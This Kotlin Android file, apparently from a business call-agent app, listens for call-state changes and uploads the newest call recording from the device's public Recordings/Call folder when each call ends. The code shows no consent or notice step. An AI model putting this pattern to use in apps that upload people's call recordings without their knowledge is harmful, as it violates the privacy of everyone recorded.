package com.example.bizagent

import WebClient
import android.content.Context
import android.os.Environment
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.io.IOException

class TelephonyCallbackImpl(val context: Context,  val webclient : WebClient) : TelephonyCallback(), TelephonyCallback.CallStateListener {

    override fun onCallStateChanged(state: Int) {

        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                // Incoming call is ringing
                Log.d("CallState", "Incoming call is ringing")
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                // Call is ongoing (call answered)
                Log.d("CallState", "Call is ongoing")
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                val srcDir =  File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_RECORDINGS), "Call")
                val src = FileUtils.getLastModifiedFile(srcDir)

                try {
                    src?.let { it1 -> webclient.executePostRequest(src) }
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }
        }
    }
}